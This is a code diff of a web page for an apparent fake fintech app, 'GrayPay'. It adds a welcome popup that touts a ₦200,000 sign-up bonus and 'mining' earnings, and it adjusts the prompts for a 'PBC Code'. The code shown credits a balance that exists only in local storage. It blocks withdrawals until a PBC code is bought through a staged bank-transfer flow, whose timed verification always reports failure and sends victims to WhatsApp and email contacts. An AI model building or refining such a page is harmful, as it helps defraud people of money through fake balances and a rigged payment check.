@@ -115,7 +115,7 @@
     <div id="dynamicContent"></div>
 </div>
 
-<div id="helpModal" class="modal"><div class="modal-content"><h3>Contact Support</h3><button class="btn" onclick="window.open('https://wa.me/2348168909003','_blank')">💬 WhatsApp</button><button class="btn" style="margin-top:10px;" onclick="location.href='mailto:graypay423492@gmail.com'">📧 Email</button><button class="btn" onclick="closeHelp()">Close</button></div></div>
+<div id="helpModal" class="modal"><div class="modal-content"><h3>Contact Support</h3><button class="btn" onclick="window.open('https://wa.me/2348168909003','_blank')">💬 WhatsApp</button><button class="btn" style="margin-top: 12px;" onclick="location.href='mailto:graypay423492@gmail.com'">📧 Email</button><button class="btn" style="margin-top: 12px;" onclick="closeHelp()">Close</button></div></div>
 <div id="loadingOverlay" class="loading"><div>⏳</div><div id="loadingMsg">Processing...</div></div>
 
 <script>
@@ -165,8 +165,8 @@
         for(let u of users) if(u.email === em) { document.getElementById('signupError').innerText = 'Email exists'; return; }
         let newUser = { id: Date.now(), firstname: fn, surname: sn, email: em, password: pw, balance: 200000, miningActive: false, miningEnd: null, transactions: [{ type: 'Bonus', amount: 200000, date: new Date().toLocaleString(), status: 'Success' }] };
         users.push(newUser); saveUsers(); currentUser = newUser; localStorage.setItem('graypay_current', em);
-        alert('Welcome! You have ₦200,000 bonus.');
         showDashboardPage();
+        showWelcomePopup();
     }
 
     function login() {
@@ -192,7 +192,7 @@
         if(!currentUser) return;
         let banks = ['Access Bank', 'GTBank', 'First Bank', 'Zenith Bank', 'UBA', 'WEMA Bank', 'Polaris Bank', 'Fidelity Bank', 'Sterling Bank', 'PalmPay', 'Opay', 'Moniepoint', 'Kuda Bank'];
         let opts = banks.map(b => `<option>${b}</option>`).join('');
-        document.getElementById('dynamicContent').innerHTML = `<div id="withdrawView"><div class="header"><button class="back-btn" onclick="closeDynamic()">←</button><button class="help-btn" onclick="showHelp()">❓</button></div><h2>Transfer To Bank</h2><input type="text" id="accName" class="input-field" placeholder="Account Name"><input type="text" id="accNumber" class="input-field" placeholder="Account Number"><select id="bankName" class="input-field">${opts}</select><input type="number" id="withdrawAmount" class="input-field" placeholder="Amount"><input type="text" id="pbcCode" class="input-field" placeholder="PBC Code (4234)"><div class="info-box">Available: ₦${currentUser.balance}</div><div class="min-withdrawal">⚠️ Minimum withdrawal: ₦100,000</div><button class="btn" onclick="processWithdraw()">Submit</button></div>`;
+        document.getElementById('dynamicContent').innerHTML = `<div id="withdrawView"><div class="header"><button class="back-btn" onclick="closeDynamic()">←</button><button class="help-btn" onclick="showHelp()">❓</button></div><h2>Transfer To Bank</h2><input type="text" id="accName" class="input-field" placeholder="Account Name"><input type="text" id="accNumber" class="input-field" placeholder="Account Number"><select id="bankName" class="input-field">${opts}</select><input type="number" id="withdrawAmount" class="input-field" placeholder="Amount"><input type="text" id="pbcCode" class="input-field" placeholder="PBC Code (e.g., 1234)"><div class="info-box">Available: ₦${currentUser.balance}</div><div class="min-withdrawal">⚠️ Minimum withdrawal: ₦100,000</div><button class="btn" onclick="processWithdraw()">Submit</button></div>`;
         showPage('dashboardPage'); document.getElementById('dashboardPage').classList.add('hidden'); document.getElementById('withdrawView').style.display = 'block'; document.getElementById('withdrawView').style.padding = '20px';
     }
     function processWithdraw() {
@@ -207,7 +207,7 @@
     // ========== BUY AIRTIME ==========
     function showBuyAirtime() {
         if(!currentUser) return;
-        document.getElementById('dynamicContent').innerHTML = `<div id="airtimeView"><div class="header"><button class="back-btn" onclick="closeDynamic()">←</button><button class="help-btn" onclick="showHelp()">❓</button></div><h2>Buy Airtime</h2><input type="text" id="airPhone" class="input-field" placeholder="Phone Number"><input type="number" id="airAmount" class="input-field" placeholder="Amount"><input type="text" id="airCode" class="input-field" placeholder="PBC Code (4234)"><button class="btn" onclick="processAirtime()">Buy Airtime</button></div>`;
+        document.getElementById('dynamicContent').innerHTML = `<div id="airtimeView"><div class="header"><button class="back-btn" onclick="closeDynamic()">←</button><button class="help-btn" onclick="showHelp()">❓</button></div><h2>Buy Airtime</h2><input type="text" id="airPhone" class="input-field" placeholder="Phone Number"><input type="number" id="airAmount" class="input-field" placeholder="Amount"><input type="text" id="airCode" class="input-field" placeholder="PBC Code (e.g., 1234)"><button class="btn" onclick="processAirtime()">Buy Airtime</button></div>`;
         showPage('dashboardPage'); document.getElementById('dashboardPage').classList.add('hidden'); document.getElementById('airtimeView').style.display = 'block'; document.getElementById('airtimeView').style.padding = '20px';
     }
     function processAirtime() {
@@ -223,7 +223,7 @@
     // ========== BUY DATA ==========
     function showBuyData() {
         if(!currentUser) return;
-        document.getElementById('dynamicContent').innerHTML = `<div id="dataView"><div class="header"><button class="back-btn" onclick="closeDynamic()">←</button><button class="help-btn" onclick="showHelp()">❓</button></div><h2>Buy Data</h2><input type="text" id="dataPhone" class="input-field" placeholder="Phone Number"><select id="dataPlan" class="input-field"><option value="500">500MB - ₦500</option><option value="1000">1GB - ₦1000</option><option value="2000">2GB - ₦2000</option><option value="5000">5GB - ₦5000</option><option value="10000">10GB - ₦10000</option></select><input type="text" id="dataCode" class="input-field" placeholder="PBC Code (4234)"><button class="btn" onclick="processData()">Buy Data</button></div>`;
+        document.getElementById('dynamicContent').innerHTML = `<div id="dataView"><div class="header"><button class="back-btn" onclick="closeDynamic()">←</button><button class="help-btn" onclick="showHelp()">❓</button></div><h2>Buy Data</h2><input type="text" id="dataPhone" class="input-field" placeholder="Phone Number"><select id="dataPlan" class="input-field"><option value="500">500MB - ₦500</option><option value="1000">1GB - ₦1000</option><option value="2000">2GB - ₦2000</option><option value="5000">5GB - ₦5000</option><option value="10000">10GB - ₦10000</option></select><input type="text" id="dataCode" class="input-field" placeholder="PBC Code (e.g., 1234)"><button class="btn" onclick="processData()">Buy Data</button></div>`;
         showPage('dashboardPage'); document.getElementById('dashboardPage').classList.add('hidden'); document.getElementById('dataView').style.display = 'block'; document.getElementById('dataView').style.padding = '20px';
     }
     function processData() {
@@ -251,7 +251,7 @@
     }
     function pbcStep1() { showLoading('Processing...', 10000, () => showPalmPayWarning()); }
     function showPalmPayWarning() {
-        document.getElementById('dynamicContent').innerHTML = `<div id="warningView"><div class="header"><button class="back-btn" onclick="goBackToPBC()">←</button><button class="help-btn" onclick="showHelp()">❓</button></div><div class="warning-box"><h2>PalmPay Service Down</h2><p>Please do not use PalmPay for payments at this time. Use other supported banks.</p></div><button class="btn" onclick="pbcStep2()">Proceed to Bank Transfer</button><button class="btn" onclick="pbcStep2()">I Understand</button></div>`;
+        document.getElementById('dynamicContent').innerHTML = `<div id="warningView"><div class="header"><button class="back-btn" onclick="goBackToPBC()">←</button><button class="help-btn" onclick="showHelp()">❓</button></div><div class="warning-box"><h2>PalmPay Service Down</h2><p>Please do not use PalmPay for payments at this time. Use other supported banks.</p></div><button class="btn" onclick="pbcStep2()">Proceed to Bank Transfer</button><button class="btn" style="margin-top: 12px;" onclick="pbcStep2()">I Understand</button></div>`;
         document.getElementById('warningView').style.display = 'block'; document.getElementById('warningView').style.padding = '20px';
     }
     function goBackToPBC() { showBuyPBC(); }
@@ -264,7 +264,7 @@
     function goBackToWarning() { showPalmPayWarning(); }
     function pbcStep3() { showLoading('Verifying payment...', 20000, () => showFailed()); }
     function showFailed() {
-        document.getElementById('dynamicContent').innerHTML = `<div id="failedView"><div class="header"><button class="back-btn" onclick="goBackToBank()">←</button><button class="help-btn" onclick="showHelp()">❓</button></div><div class="warning-box"><h2>Transaction verification failed!</h2><p>No Payment received from you / invalid payment method.</p></div><button class="btn" onclick="goBackToBank()">Try Again</button><button class="btn" onclick="showHelp()">❓ You Need Help?</button></div>`;
+        document.getElementById('dynamicContent').innerHTML = `<div id="failedView"><div class="header"><button class="back-btn" onclick="goBackToBank()">←</button><button class="help-btn" onclick="showHelp()">❓</button></div><div class="warning-box"><h2>Transaction verification failed!</h2><p>No Payment received from you / invalid payment method.</p></div><button class="btn" onclick="goBackToBank()">Try Again</button><button class="btn" style="margin-top: 12px;" onclick="showHelp()">❓ You Need Help?</button></div>`;
         document.getElementById('failedView').style.display = 'block'; document.getElementById('failedView').style.padding = '20px';
     }
     function goBackToBank() { showBankDetails(); }
@@ -299,6 +299,28 @@
     function showHelp() { document.getElementById('helpModal').style.display = 'flex'; }
     function closeHelp() { document.getElementById('helpModal').style.display = 'none'; }
     function showLoading(msg, ms, cb) { let loader = document.getElementById('loadingOverlay'); document.getElementById('loadingMsg').innerText = msg; loader.style.display = 'flex'; setTimeout(() => { loader.style.display = 'none'; if(cb) cb(); }, ms); }
+
+    // ========== WELCOME POPUP ==========
+    function showWelcomePopup() {
+        let popupHtml = `
+            <div id="welcomePopup" style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.9); display: flex; align-items: center; justify-content: center; z-index: 3000;">
+                <div style="background: #1f1f1f; border-radius: 20px; padding: 30px; width: 85%; max-width: 350px; text-align: center;">
+                    <div style="font-size: 50px; margin-bottom: 15px;">🎉</div>
+                    <h2 style="color: #10b981; margin-bottom: 10px;">Welcome ${currentUser.firstname}!</h2>
+                    <p style="color: #9ca3af; margin-bottom: 20px;">You have received</p>
+                    <div style="font-size: 36px; font-weight: bold; color: #10b981; margin-bottom: 20px;">₦200,000</div>
+                    <p style="color: #9ca3af; margin-bottom: 25px;">Start mining every hour and withdraw your earnings anytime!</p>
+                    <button class="btn" onclick="closeWelcomePopup()" style="background: #10b981; padding: 12px 24px;">Get Started</button>
+                </div>
+            </div>
+        `;
+        document.body.insertAdjacentHTML('beforeend', popupHtml);
+    }
+
+    function closeWelcomePopup() {
+        let popup = document.getElementById('welcomePopup');
+        if(popup) popup.remove();
+    }
 
     autoLogin();
 </script>
